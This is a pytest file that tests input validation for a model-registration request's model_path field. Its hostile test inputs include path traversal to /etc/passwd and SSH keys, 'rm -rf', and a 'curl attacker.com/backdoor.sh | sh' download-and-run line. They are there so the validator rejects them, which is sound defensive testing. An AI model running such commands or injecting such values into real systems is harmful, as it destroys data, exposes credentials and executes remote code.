"""Tests for RegisterModelVersionRequest.model_path validation.

Verifies that:
- Valid relative and absolute paths are accepted.
- Path traversal sequences are rejected.
- Shell metacharacters and special characters are rejected.
- Paths exceeding max_length=512 are rejected.
- Empty paths are rejected.
"""

from __future__ import annotations

import pytest
from pydantic import ValidationError

from backend.routers.governance import RegisterModelVersionRequest


def _make(model_path: str) -> RegisterModelVersionRequest:
    return RegisterModelVersionRequest(
        model_name="test_model",
        model_path=model_path,
        rmse=0.5,
        r2_score=0.9,
    )


# ---------------------------------------------------------------------------
# Valid paths
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "path",
    [
        "models/crop_yield_v1.joblib",
        "ml/saved/random_forest.pkl",
        "/opt/models/agri_model.joblib",
        "model_v2.pkl",
        "models/2024-01-15/yield_model.pkl",
        "a" * 512,   # exactly at the limit
    ],
)
def test_valid_model_paths(path: str) -> None:
    req = _make(path)
    assert req.model_path == path


# ---------------------------------------------------------------------------
# Path traversal
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "path",
    [
        "../../../etc/passwd",
        "models/../../etc/shadow",
        "..\\..\\windows\\system32",
        "models/../../../root/.ssh/id_rsa",
        "./models/../../../etc/passwd",
    ],
)
def test_rejects_path_traversal(path: str) -> None:
    with pytest.raises(ValidationError, match="traversal"):
        _make(path)


# ---------------------------------------------------------------------------
# Shell metacharacters and injection
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "path",
    [
        "model; rm -rf /home",
        "model && curl http://attacker.com/backdoor.sh | sh",
        "model`whoami`",
        "model$(id)",
        "model|cat /etc/passwd",
        "model > /tmp/out",
        "model\x00null",
    ],
)
def test_rejects_shell_metacharacters(path: str) -> None:
    with pytest.raises(ValidationError):
        _make(path)


# ---------------------------------------------------------------------------
# Length constraints
# ---------------------------------------------------------------------------


def test_rejects_empty_path() -> None:
    with pytest.raises(ValidationError):
        _make("")


def test_rejects_path_over_512_chars() -> None:
    with pytest.raises(ValidationError):
        _make("a" * 513)


# ---------------------------------------------------------------------------
# model_name bounds (existing -- regression guard)
# ---------------------------------------------------------------------------


def test_rejects_empty_model_name() -> None:
    with pytest.raises(ValidationError):
        RegisterModelVersionRequest(
            model_name="",
            model_path="models/v1.pkl",
            rmse=0.5,
        )


def test_rejects_model_name_over_50_chars() -> None:
    with pytest.raises(ValidationError):
        RegisterModelVersionRequest(
            model_name="A" * 51,
            model_path="models/v1.pkl",
            rmse=0.5,
        )
